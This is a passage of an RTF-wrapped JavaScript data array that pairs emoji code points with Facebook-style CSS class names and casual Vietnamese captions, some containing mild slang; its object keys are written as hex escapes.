        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2e5',\par
        "\\x6E\\x61\\x6D\\x65": 'V\\u1ED7 tay ngay & lu\\xF4n'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC4C ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2e6',\par
        "\\x6E\\x61\\x6D\\x65": 'OK, anh hi\\u1EC3u r\\u1ED3i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC4D ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2e7',\par
        "\\x6E\\x61\\x6D\\x65": '\\u01AFng \\xFD c\\u1EE7a th\\xEDm r\\u1ED3i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC4E ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2e8',\par
        "\\x6E\\x61\\x6D\\x65": '\\xDD th\\xEDm nh\\u01B0 ***'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC4F ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2e9',\par
        "\\x6E\\x61\\x6D\\x65": '\\u1EE6ng h\\u1ED9 nhi\\u1EC7t t\\xECnh'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC50 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ea',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\xF2ng tay em l\\u1EA1i \\u0111i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC66 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2eb',\par
        "\\x6E\\x61\\x6D\\x65": 'HOT Boy'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC67 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ec',\par
        "\\x6E\\x61\\x6D\\x65": 'HOT Girl'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC68 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ed',\par
        "\\x6E\\x61\\x6D\\x65": 'X - Men'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC69 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ee',\par
        "\\x6E\\x61\\x6D\\x65": 'Ph\\u1EE5 n\\u1EEF'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC6B ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ef',\par
        "\\x6E\\x61\\x6D\\x65": 'N\\u1EAFm tay c\\xE1i xem n\\xE0o'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC6E ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2eg',\par
        "\\x6E\\x61\\x6D\\x65": 'Gi\\u1EDD c\\xE1c th\\xEDm mu\\u1ED1n g\\xEC? C\\u1EA3nh s\\xE1t \\u0111\\xE2y'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC6F ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2eh',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EDBi t\\u1EADu c\\xE1i tai th\\u1ECF'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC71 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ei',\par
        "\\x6E\\x61\\x6D\\x65": '\\u0110\\u1EA7u m\\u1EDBi'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC72 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ej',\par
        "\\x6E\\x61\\x6D\\x65": 'Nh\\xECn c\\u0169ng \\u0111\\u1EADp chai ph\\u1EBFt'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC73 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ek',\par
        "\\x6E\\x61\\x6D\\x65": '\\u0110\\xE2y \\u0111\\u1EADp h\\u01A1n nha c\\u01B0ng'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC74 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2el',\par
        "\\x6E\\x61\\x6D\\x65": '\\u1EEA, c\\xF2n m\\xECnh th\\xEC gi\\xE0 cmnr'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC75 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2em',\par
        "\\x6E\\x61\\x6D\\x65": 'Em c\\u0169ng gi\\xE0 cmnr'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC76 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2en',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\xECnh c\\xF2n nh\\u1ECF qu\\xE1, ch\\u1ECBu kh\\xF3 FA v\\u1EADy'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC77 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2eo',\par
        "\\x6E\\x61\\x6D\\x65": '\\u0110\\u1ED9i m\\u0169 \\u0111i l\\xE0m n\\xE0o'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC78 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ep',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\xF4ng ch\\xFAa'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC7B ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2eq',\par
        "\\x6E\\x61\\x6D\\x65": 'Ma \\u0111\\xE2y, xo\\u1EAFn ch\\u01B0a?'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC7C ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2er',\par
        "\\x6E\\x61\\x6D\\x65": 'Em l\\xE0 thi\\xEAn th\\u1EA7n, nh\\xECn em gi\\u1ED1ng con \\u0111\\u1EA7n'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC7D ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2es',\par
        "\\x6E\\x61\\x6D\\x65": 'H\\u1ED5 b\\xE1o th\\u1EBF n\\xE0y \\u0111\\u01B0\\u1EE3c ch\\u01B0a?'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC7E ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2et',\par
        "\\x6E\\x61\\x6D\\x65": 'H\\u1ED5 b\\xE1o t\\u1EEB m\\u1EABu gi\\xE1o'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC7F ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2eu',\par
        "\\x6E\\x61\\x6D\\x65": '\\u0110\\u1EE7 c\\u1EE9ng ch\\u01B0a?'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC80 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ev',\par
        "\\x6E\\x61\\x6D\\x65": '\\u0110\\u1EA7u l\\xE2u'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC82 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ew',\par
        "\\x6E\\x61\\x6D\\x65": 'Ho\\xE0ng t\\u1EED ba t\\u01B0'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC83 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ex',\par
        "\\x6E\\x61\\x6D\\x65": 'Con ch\\xFAa ba l\\u0103m'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC85 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ey',\par
        "\\x6E\\x61\\x6D\\x65": 'S\\u01A1n m\\xF3ng tay ph\\xE1t'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC8B ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ez',\par
        "\\x6E\\x61\\x6D\\x65": 'Y\\xEAu mi\\u1EBFng'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC8F ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2e-',\par
        "\\x6E\\x61\\x6D\\x65": 'B\\u1ECDn m\\xECnh h\\xF4n cmn nhau \\u0111\\xEA'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC90 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2e_',\par
        "\\x6E\\x61\\x6D\\x65": 'Hoa h\\xF2e'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC91 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2f0',\par
        "\\x6E\\x61\\x6D\\x65": 'B\\u1ECDn m\\xECnh trao tim cmn cho nhau \\u0111\\xEA'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC93 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2f1',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\u1ED1 b\\u1EAFt Wifi tr\\xE1i tim em m\\u1EDBi \\u0111\\u01B0\\u1EE3c'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC94 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2f2',\par
        "\\x6E\\x61\\x6D\\x65": 'Tim t\\xF4i v\\u1EE1 cmnr'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC96 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2f3',\par
        "\\x6E\\x61\\x6D\\x65": 'Tim t\\xF4i tan ch\\u1EA3y cmnr'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC97 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2f4',\par
        "\\x6E\\x61\\x6D\\x65": 'Tr\\xE1i tim 1'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC98 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2f5',\par
        "\\x6E\\x61\\x6D\\x65": 'Tr\\xE1i tim 2'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC99 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2f6',\par
        "\\x6E\\x61\\x6D\\x65": 'Tr\\xE1i tim 3'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC9A ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2f7',\par
        "\\x6E\\x61\\x6D\\x65": 'Tr\\xE1i tim 4'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC9B ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2f8',\par
        "\\x6E\\x61\\x6D\\x65": 'Tr\\xE1i tim 5'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC9C ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2f9',\par
        "\\x6E\\x61\\x6D\\x65": 'Tr\\xE1i tim 6'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDC9D ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fa',\par
        "\\x6E\\x61\\x6D\\x65": 'Ch\\xF3i cm tim th\\xEDm l\\u1EA1i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCA2 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fb',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u1EA1ng nh\\u1EC7n'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCA4 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fc',\par
        "\\x6E\\x61\\x6D\\x65": 'Ng\\u1EE7 th\\xF4i'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCA6 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fd',\par
        "\\x6E\\x61\\x6D\\x65": 'Phun'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCA8 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fe',\par
        "\\x6E\\x61\\x6D\\x65": 'Gi\\xF3 th\\u1ED5i vi vu'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCA9 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ff',\par
        "\\x6E\\x61\\x6D\\x65": 'Shit'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCAA ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fg',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\u1EE9ng th\\u1EBF n\\xE0y \\u01B0ng kh\\xF4ng?'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCBB ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fh',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\xE1y t\\xEDnh m\\u1EDBi t\\u1EADu'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCBD ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fi',\par
        "\\x6E\\x61\\x6D\\x65": 'CD nh\\u1EA1c'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCBE ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fj',\par
        "\\x6E\\x61\\x6D\\x65": '\\u1ED4n c\\u1EE9ng'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCBF ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fk',\par
        "\\x6E\\x61\\x6D\\x65": '\\u0110ia tr\\u1EAFng'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCC0 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fl',\par
        "\\x6E\\x61\\x6D\\x65": 'DVD'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCDE ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fm',\par
        "\\x6E\\x61\\x6D\\x65": 'Anh nghe'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCE0 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fn',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\xF3 g\\xEC c\\u1EE9 g\\u1EEDi Fax cho anh'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCF1 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fo',\par
        "\\x6E\\x61\\x6D\\x65": 'Iphone 9'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCF2 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fp',\par
        "\\x6E\\x61\\x6D\\x65": 'Iphone 9s'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDCFA ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fq',\par
        "\\x6E\\x61\\x6D\\x65": '\\u0110ang xem TIVI'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDD14 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fr',\par
        "\\x6E\\x61\\x6D\\x65": 'Chu\\xF4ng'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE01 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fs',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE02 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ft',\par
        "\\x6E\\x61\\x6D\\x65": 'Kh\\xF3c cmnr'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE03 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fu',\par
        "\\x6E\\x61\\x6D\\x65": 'C\\u01B0\\u1EDDi'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE04 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fv',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 2'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE06 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fw',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 3'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE09 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fx',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 4'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE0B ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fy',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 5'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE0C ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2fz',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 6'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE0D ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2f-',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 7'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE0F ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2f_',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 8'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE12 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2g0',\par
        "\\x6E\\x61\\x6D\\x65": 'Ch\\xE1n vl'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE13 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2g1',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 9'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE14 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2g2',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 10'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE16 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2g3',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 11'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE18 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2g4',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 12'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE1A ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2g5',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 13'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE1C ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2g6',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 14'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE1D ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2g7',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 15'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE1E ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2g8',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 16'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE20 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2g9',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 17'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE21 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ga',\par
        "\\x6E\\x61\\x6D\\x65": 'M\\u01A1 ka \\u0111\\u1EC1, ch\\u1ECB n\\xF3ng r\\u1ED3i \\u0111\\u1EA5y nh\\xE9'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE22 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gb',\par
        "\\x6E\\x61\\x6D\\x65": 'Huhu...'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE23 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gc',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 18'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE24 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gd',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 19'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE25 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2ge',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 20'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE28 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gf',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 21'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE29 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gg',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 22'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE2A ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gh',\par
        "\\x6E\\x61\\x6D\\x65": 'Ng\\u1EE7 cmnr nh\\xE9'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE2B ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gi',\par
        "\\x6E\\x61\\x6D\\x65": 'H\\xF4m nay m\\u1EC7t vl'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE2D ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gj',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 23'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE30 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gk',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 24'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE31 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gl',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 25'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE32 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gm',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 26'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE33 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gn',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 27'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE35 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2go',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 28'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE37 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gp',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 29'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE38 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gq',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 30'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE39 ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gr',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 31'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE3A ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gs',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 32'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE3B ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gt',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 33'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE3C ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gu',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 34'\par
    \}, \{\par
        "\\x63\\x68\\x61\\x72\\x73": ' \\uD83D\\uDE3D ',\par
        "\\x63\\x6C\\x61\\x73\\x73": '_1az _1a- _2gv',\par
        "\\x6E\\x61\\x6D\\x65": 'Bi\\u1EC3u t\\u01B0\\u1EE3ng vui 35'\par
    \}, \{\par
